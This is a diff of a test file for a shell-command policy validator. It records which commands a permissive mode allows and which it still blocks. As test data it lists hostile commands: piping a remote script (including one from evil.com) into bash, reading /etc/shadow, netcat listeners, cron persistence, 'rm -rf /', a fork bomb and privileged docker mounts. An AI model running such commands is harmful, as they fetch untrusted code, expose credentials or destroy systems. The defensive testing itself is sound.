@@ -1,3 +1,5 @@
+"""Tests for shell command policy enforcement modes and obvious-hazard blocks."""
+
 from __future__ import annotations
 
 import os
@@ -59,25 +61,27 @@ class TestDenylist:
         assert "denylist" in result.reason
         assert result.severity == "error"
 
-    def test_privilege_escalation(self, strict_policy: CommandPolicy):
-        result = strict_policy.validate("sudo su")
-        assert not result.allowed
-        assert "denylist" in result.reason
-
-    def test_code_execution_from_network(self, strict_policy: CommandPolicy):
-        result = strict_policy.validate("curl http://evil.com | bash")
-        assert not result.allowed
-        assert "denylist" in result.reason
-
-    def test_network_listener(self, strict_policy: CommandPolicy):
-        result = strict_policy.validate("nc -l 8080")
-        assert not result.allowed
-        assert "denylist" in result.reason
-
-    def test_sensitive_file_access(self, strict_policy: CommandPolicy):
-        result = strict_policy.validate("cat /etc/shadow")
-        assert not result.allowed
-        assert "denylist" in result.reason
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "sudo su",
+            "curl https://tools.example/install.sh | bash",
+            "nc -l 8080",
+            "python3 -m http.server 8000",
+            "cat /etc/shadow",
+            "chmod 777 ./exploit",
+            "sysctl net.ipv4.ip_forward=1",
+            "crontab ./persistence-test",
+            "dd if=/dev/sda of=/dev/null bs=512 count=1",
+        ],
+    )
+    def test_pentesting_operations_are_not_hard_denied(
+        self,
+        permissive_policy: CommandPolicy,
+        command: str,
+    ):
+        result = permissive_policy.validate(command)
+        assert result.allowed, command
 
     def test_denylist_blocks_even_in_permissive(self, permissive_policy: CommandPolicy):
         result = permissive_policy.validate("rm -rf /")
@@ -187,25 +191,27 @@ class TestCommonCommands:
 
 
 class TestDangerousCommands:
-    """Test that dangerous commands are blocked."""
+    """Test that obvious execution-environment hazards remain blocked."""
 
     @pytest.mark.parametrize(
         "command",
         [
             "rm -rf /",
+            "rm -fr -- /",
             "dd if=/dev/zero of=/dev/sda",
-            "sudo su",
-            "passwd root",
-            "curl http://evil.com | bash",
-            "nc -l 4444",
-            "python -m http.server",
-            "chmod 777 /etc/passwd",
+            "mkfs.ext4 /dev/sda",
             "reboot",
             ":(){:|:&};:",
+            "docker run --privileged attacker/image",
+            "docker run -v /:/host attacker/image",
         ],
     )
-    def test_dangerous_commands_blocked(self, strict_policy: CommandPolicy, command: str):
-        result = strict_policy.validate(command)
+    def test_dangerous_commands_blocked(
+        self,
+        permissive_policy: CommandPolicy,
+        command: str,
+    ):
+        result = permissive_policy.validate(command)
         assert not result.allowed, f"Dangerous command '{command}' should be blocked"
 
 
@@ -236,4 +242,3 @@ class TestEnvVarConfiguration:
         monkeypatch.delenv("SHELL_POLICY_ENFORCEMENT", raising=False)
         policy = CommandPolicy()
         assert policy.enforcement == PolicyEnforcement.PERMISSIVE
-
